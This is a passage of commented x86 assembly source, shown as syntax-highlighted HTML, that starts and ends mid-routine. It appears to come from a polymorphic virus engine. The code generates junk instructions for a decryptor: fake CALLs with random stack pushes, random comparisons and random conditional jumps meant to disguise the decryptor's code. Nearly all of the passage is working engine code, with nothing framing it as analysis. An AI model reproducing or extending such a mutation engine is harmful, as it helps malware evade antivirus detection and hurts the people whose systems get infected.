                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">ArrayOfCalls1Ndx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@NormalCALL</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@SelectRandomFixedCALL</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">ArrayOfCalls1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@ContinueFixedCALL_002</span><span class="sc0">
      </span><span class="sc5">@@SelectRandomFixedCALL</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">ArrayOfCalls1</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc5">@@LoopFixedCALL_001</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">ArrayOfCalls1Ndx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@LoopFixedCALL_001</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">ArrayOfCalls1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">@@ContinueFixedCALL_002</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptorBeginAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptorVirtualBeginAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MakeCALLTo</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">

         </span><span class="sc5">@@NormalCALL</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel1Ndx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Make1</span><span class="sc0">   </span><span class="sc1">; If we can't do more level 1 calls, do other</span><span class="sc0">
                                </span><span class="sc1">; type of garbage</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel2Ndx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Make1</span><span class="sc0">   </span><span class="sc1">; If we can't do more level 2 calls, do other</span><span class="sc0">
                                </span><span class="sc1">; type of garbage</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel3Ndx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Make1</span><span class="sc0">   </span><span class="sc1">; If we can't do more level 3 calls, do other</span><span class="sc0">
                                </span><span class="sc1">; type of garbage</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyIsInit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; Is the key register set?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Make1</span><span class="sc0">                </span><span class="sc1">; If it isn't, then avoid CALLs.</span><span class="sc0">
                         </span><span class="sc1">; Explanation: we make first the CALL and quite later</span><span class="sc0">
                         </span><span class="sc1">; we code the subroutine itself. Then, we maybe put</span><span class="sc0">
                         </span><span class="sc1">; inside the subroutines any indexed memory access,</span><span class="sc0">
                         </span><span class="sc1">; for which we need the Key register with its correct</span><span class="sc0">
                         </span><span class="sc1">; value. If it isn't set yet, then when call to the</span><span class="sc0">
                         </span><span class="sc1">; subroutine we'll use the Key register as index but</span><span class="sc0">
                         </span><span class="sc1">; with an unknown value.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">  </span><span class="sc1">; Stack entries?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoStack</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@NoStack</span><span class="sc0">
                           </span><span class="sc1">; Put stack entries with a 25% of probability</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@WithStack</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; Mark it</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; Get a number between 1 and 4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@StackEntries</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; Save this number</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; ECX=that number</span><span class="sc0">
   </span><span class="sc5">@@LoopInsertEntries</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">      </span><span class="sc1">; Opcode of PUSH Value</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                </span><span class="sc1">; Store it</span><span class="sc0">
   </span><span class="sc5">@@AnotherValueTypeForStack</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">       </span><span class="sc1">; Get a random type of value to push</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@PushRegister</span><span class="sc0">    </span><span class="sc1">; AL=0? Then push a register</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@PushAddress</span><span class="sc0">     </span><span class="sc1">; AL=1? Then push a memory address</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@PushPureRandom</span><span class="sc0">  </span><span class="sc1">; AL=2? Then push a random dword</span><span class="sc0">
    </span><span class="sc5">@@PushPseudoFlags</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; AL=3? Then push a random &lt; 10000h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">                               </span><span class="sc1">; (like flags)</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextStackEntry</span><span class="sc0">  </span><span class="sc1">; Store value</span><span class="sc0">
    </span><span class="sc5">@@PushAddress</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectAnAddressLow</span><span class="sc0"> </span><span class="sc1">; Get an address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; Put it into EAX and jump to store it</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextStackEntry</span><span class="sc0">  </span><span class="sc1">; Jump to store it</span><span class="sc0">
    </span><span class="sc5">@@PushRegister</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectAnyRegisterWithInit</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@ContinueStackEntries</span><span class="sc0">
    </span><span class="sc5">@@PushPureRandom</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">          </span><span class="sc1">; EAX=Random value</span><span class="sc0">
    </span><span class="sc5">@@NextStackEntry</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@TwoBytesEntry</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF80h</span><span class="sc0"> </span><span class="sc1">; Is the value between -80h and 7Fh?</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@TwoBytesEntry</span><span class="sc0">   </span><span class="sc1">; If it is, change the opcode</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">; Store the dword</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@ContinueStackEntries</span><span class="sc0"> </span><span class="sc1">; Jump and continue</span><span class="sc0">

   </span><span class="sc5">@@TwoBytesEntry</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">6Ah</span><span class="sc0"> </span><span class="sc1">; Change the opcode by PUSH</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">         </span><span class="sc1">; Packed_Dword_Value and store the value to push</span><span class="sc0">
   </span><span class="sc5">@@ContinueStackEntries</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">  </span><span class="sc5">@@LoopInsertEntries</span><span class="sc0"> </span><span class="sc1">; Loop and make it ECX times</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@ContinueCALL</span><span class="sc0">      </span><span class="sc1">; Continue the CALL coding</span><span class="sc0">
                </span><span class="sc1">;; Here if we don't use stack</span><span class="sc0">
   </span><span class="sc5">@@NoStack</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@WithStack</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Set this variable</span><span class="sc0">
   </span><span class="sc5">@@ContinueCALL</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">             </span><span class="sc1">; Insert a CALL opcode</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GarbageRecursivity</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the level</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                                    </span><span class="sc1">; of the stack</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">  
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">   </span><span class="sc1">; *20h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; *21h</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">   </span><span class="sc1">; *84h, so we get the level multiplied by</span><span class="sc0">
                                 </span><span class="sc1">; 84h, to use a generic way of setting the</span><span class="sc0">
                                 </span><span class="sc1">; CALL data into the arrays depending on the</span><span class="sc0">
                                 </span><span class="sc1">; level</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">CallsLevel1Ndx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Get the index of inser-</span><span class="sc0">
                                                      </span><span class="sc1">;tion</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; Add the level*84h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">CallsLevel1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Set the current</span><span class="sc0">
                                 </span><span class="sc1">; address into the array for later completion</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">CallsLevel1Ndx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">; Increase the</span><span class="sc0">
                                                        </span><span class="sc1">; index of insertion</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">   </span><span class="sc1">; Leave space for the CALL displacement and</span><span class="sc0">
                                 </span><span class="sc1">; complete it later</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@WithStack</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; Have we used stack?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">                        </span><span class="sc1">; If not, finish</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C483h</span><span class="sc0">  </span><span class="sc1">; AX=Opcode of the instruction ADD ESP,xxx</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@StackEntries</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the number to</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; add to ESP to release the stack</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">; Store it</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">      </span><span class="sc1">; Return</span><span class="sc0">

</span><span class="sc5">@@WithStack</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; Variables used before</span><span class="sc0">
</span><span class="sc5">@@StackEntries</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc1">;; Here we make a random conditional jump. The comparision is absolutely</span><span class="sc0">
   </span><span class="sc1">;; random, so it's the condition to jump. Between the jump and the destiny</span><span class="sc0">
   </span><span class="sc1">;; we make functional garbage, since we don't know if the jump is going to</span><span class="sc0">
   </span><span class="sc1">;; be taken or not.</span><span class="sc0">
    </span><span class="sc5">@@DoConditionalJump</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectARegisterWithInit</span><span class="sc0"> </span><span class="sc1">; Get a initialized register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">; Save it in DL</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">   </span><span class="sc1">; CMP Reg,Value or CMP Reg,Reg?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CMP_Reg</span><span class="sc0">       </span><span class="sc1">; Then make a CMP Reg,Reg</span><span class="sc0">
        </span><span class="sc5">@@CMP_Value</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@CMP_Value_NoEax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Dh</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@CMP_Value_Cont00</span><span class="sc0">
        </span><span class="sc5">@@CMP_Value_NoEax</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F881h</span><span class="sc0">    </span><span class="sc1">; Opcode of CMP Reg,Value</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">        </span><span class="sc1">; Set the register</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                 </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc5">@@CMP_Value_Cont00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">                 </span><span class="sc1">; Store a random value to compare</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@CJ_Again</span><span class="sc0">      </span><span class="sc1">; Jump to continue</span><span class="sc0">
        </span><span class="sc5">@@CMP_Reg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectAnyRegisterWithInit</span><span class="sc0"> </span><span class="sc1">; Get any initialized regis-</span><span class="sc0">
                                          </span><span class="sc1">; ter (all can be selected but ESP)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">      </span><span class="sc1">; Is it the same as the selected before?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CMP_Reg</span><span class="sc0">     </span><span class="sc1">; If it is the same, then repeat</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; Save it in DH</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C03Bh</span><span class="sc0">  </span><span class="sc1">; 3B C0, opcode of CMP Reg,Reg</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">      </span><span class="sc1">; Set the selected registers</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">; Store the opcode</span><span class="sc0">
            </span><span class="sc1">; Let's do a random conditional jump</span><span class="sc0">
        </span><span class="sc5">@@CJ_Again</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc0">  </span><span class="sc1">; Get a conditional jump random opcode</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">            </span><span class="sc1">; Store it</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">      </span><span class="sc1">; Leave space for the displacement</span><span class="sc0">
        </span><span class="sc5">@@CJ_Again3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel1Ndx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Save the indexes of</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel2Ndx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; the calls. If we have</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CallsLevel3Ndx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; to repeat the garbage</span><span class="sc0">
                                   </span><span class="sc1">; because it's too long, we have to restore</span><span class="sc0">
                                   </span><span class="sc1">; this to not set any inexistent CALL dis-</span><span class="sc0">
                                   </span><span class="sc1">; placement over other code that's not a</span><span class="sc0">
                                   </span><span class="sc1">; CALL</span><span class="sc0">
        </span><span class="sc5">@@CJ_Again2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">   </span><span class="sc1">; Save the actual storage index</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0"> </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0"> </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">   </span><span class="sc1">; Get the (-)displacement of the jump</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CJ_Again2</span><span class="sc0">  </span><span class="sc1">; If it's zero, loop to make garbage</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; Calculate true displacement</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">   </span><span class="sc1">; Does it overpass the limit for displac.?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@CJ_OK</span><span class="sc0">      </span><span class="sc1">; If not, jump and continue</span><span class="sc0">
